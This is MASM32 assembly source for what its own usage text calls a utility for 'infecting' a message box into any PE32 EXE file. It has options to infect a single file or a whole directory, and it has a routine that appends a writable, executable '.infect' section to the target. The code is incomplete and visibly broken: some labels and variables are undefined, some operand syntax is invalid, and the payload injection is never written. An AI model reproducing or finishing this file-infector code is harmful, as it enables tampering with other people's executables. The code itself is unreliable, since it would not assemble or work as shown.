  .486
  .model flat, stdcall
  option casemap:none

  include c:\masm32\include\windows.inc
  include c:\masm32\macros\macros.asm

  include c:\masm32\include\masm32.inc
  include c:\masm32\include\gdi32.inc
  include c:\masm32\include\user32.inc
  include c:\masm32\include\kernel32.inc


  includelib c:\masm32\lib\masm32.lib
  includelib c:\masm32\lib\gdi32.lib
  includelib c:\masm32\lib\user32.lib
  includelib c:\masm32\lib\kernel32.lib

  .data 
    fileArg db "-f", 0
    directoryArg db "-d", 0
    recoverArg db "-r", 0
    doRecover db 0
    usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
    exampleMsg db "Example: -f <file.exe> -r", 0
    usageDesc db "Usage Description", 0
    fileDesc db "-f Infect Message Box into only one file", 0
    dirDesc db "-d Infect Message Box into one directory", 0
    recoverDesc db "-r Recover file to original state", 0

  .code
  
start:
  call main
  exit

main proc
  LOCAL cmdline:DWORD
  LOCAL cmdlen:DWORD
  
  ;Get command line
  invoke GetCommandLine
  mov cmdline, eax

  invoke lstrlen, cmdline
  mov cmdlen, eax
  cmp cmdlen, 2
  jl _printUsage

  ; Check for "-r" argument
  invoke InString, eax, offset recoverArg
  cmp eax, 0
  jne _setRecover

  invoke InString, eax, offset fileArg
  cmp eax, 0
  jne _openFile

  invoke InString, eax, offset directoryArg
  cmp eax, 0
  jne _openDirectory

_printUsage:
  print offset usagaMsg
  print offset exampleMsg
  print offset usageDesc
  print offset fileDesc
  print offset dirDesc
  print offset recoverDesc
  jmp _exit
_setRecover:
  
_openFile:
  invoke openFile
  jmp exit

_openDirectory:
  invoke lstrcat, offset directoryArg, 0
  invoke FindFirstFile, offset directoryArg, offset findData
  cmp eax, INVALID_HANDLE_VALUE
  je printUsage
  invoke FindClose, eax
  jmp exit

_exit:
  invoke ExitProcess, 0


  ret
main endp

align proc size:DWORD, align:DWORD, address:DWORD
  ; Calculate size % align
  mov eax, size
  xor edx, edx
  div align

  ; If size % align == 0, return address + size
  test edx, edx
  jz _return_address_plus_size

  ; Otherwise, return address + (size / align + 1) * align
  inc eax
  imul eax, align
  add eax, address
  ret

_return_address_plus_size:
  add eax, address
  ret
align endp



CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
  ; Get the first section header
  invoke IMAGE_FIRST_SECTION, pNtHeader
  mov ebx, eax

  ; Get the number of sections
  mov eax, pNtHeader
  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
  movzx ecx, word ptr [eax]

  ; Section name
  push ".infect"
  pop esi

  ; Check if the section already exists
  xor edx, edx
_checkSection:
  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
  cmp eax, esi
  je _sectionExists
  inc edx
  cmp edx, ecx
  jl _checkSection

  ; Initialize the new section header
  lea eax, [ebx + ecx * 40]
  invoke ZeroMemory, eax, 40
  mov [eax], esi

  ; Set the section attributes
  invoke align, sizeOfSection, [pNtHeader + 56], 0
  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
  invoke align, [ebx + (ecx - 1) * 40 + 8], [pNtHeader + 56], [ebx + (ecx - 1) * 40 + 12]
  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
  invoke align, sizeOfSection, [pNtHeader + 60], 0
  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
  invoke align, [ebx + (ecx - 1) * 40 + 16], [pNtHeader + 60], [ebx + (ecx - 1) * 40 + 20]
  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER

  ; Update the file
  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
  invoke SetEndOfFile, hFile
  add [pNtHeader + 80], [eax + 12] + [eax + 8] ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
  inc word ptr [pNtHeader + 6]
  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
  mov eax, 1
  ret

_sectionExists:
  invoke CloseHandle, hFile
  xor eax, eax
  ret
CreateNewSection endp


end start

